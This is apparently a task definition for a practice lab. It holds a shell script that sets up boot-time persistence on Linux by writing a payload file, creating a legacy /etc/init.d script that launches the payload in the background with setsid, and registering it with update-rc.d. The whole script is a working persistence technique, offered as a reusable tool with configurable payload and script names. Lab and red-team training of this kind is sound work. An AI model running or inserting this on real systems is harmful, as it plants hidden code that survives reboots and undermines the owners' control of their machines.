name: initd-persistence
description: Practice-box persistence finding: drops a legacy SysV /etc/init.d script whose start action launches a payload, and registers it for boot with update-rc.d. Does NOT start it now -- it comes alive at next boot (or when the rcs are invoked manually). Vars: SCRIPT_NAME (required, basename inside /etc/init.d), PAYLOAD_PATH (required), PAYLOAD_BODY (optional single sh line), DESCRIPTION (optional).
script:
#!/bin/sh
set -eu


: "${SCRIPT_NAME:?SCRIPT_NAME is required}"
: "${PAYLOAD_PATH:?PAYLOAD_PATH is required}"

install -d -m 0755 "$(dirname -- "$PAYLOAD_PATH")"
printf '#!/bin/sh\n%s\n' "${PAYLOAD_BODY-}" > "$PAYLOAD_PATH"
chmod 0755 "$PAYLOAD_PATH"

{
    printf '%s\n' '#!/bin/sh'
    printf '%s\n' '### BEGIN INIT INFO'
    printf '# Provides:          %s\n' "$SCRIPT_NAME"
    printf '%s\n' '# Required-Start:    $local_fs $network'
    printf '%s\n' '# Required-Stop:     $local_fs'
    printf '%s\n' '# Default-Start:     2 3 4 5'
    printf '%s\n' '# Default-Stop:      0 1 6'
    printf '# Short-Description: %s\n' "${DESCRIPTION:-Legacy init script}"
    printf '%s\n' '### END INIT INFO'
    printf '\n%s\n' 'case "$1" in'
    printf '%s\n' '  start)'
    printf '    setsid %s >/dev/null 2>&1 &\n' "$PAYLOAD_PATH"
    printf '%s\n' '    ;;'
    printf '%s\n' '  stop|restart|force-reload|status)'
    printf '%s\n' '    ;;'
    printf '%s\n' 'esac'
    printf '%s\n' 'exit 0'
} > "/etc/init.d/$SCRIPT_NAME"
chmod 0755 "/etc/init.d/$SCRIPT_NAME"

if command -v update-rc.d >/dev/null 2>&1; then
    update-rc.d "$SCRIPT_NAME" defaults >/dev/null 2>&1 || :
fi
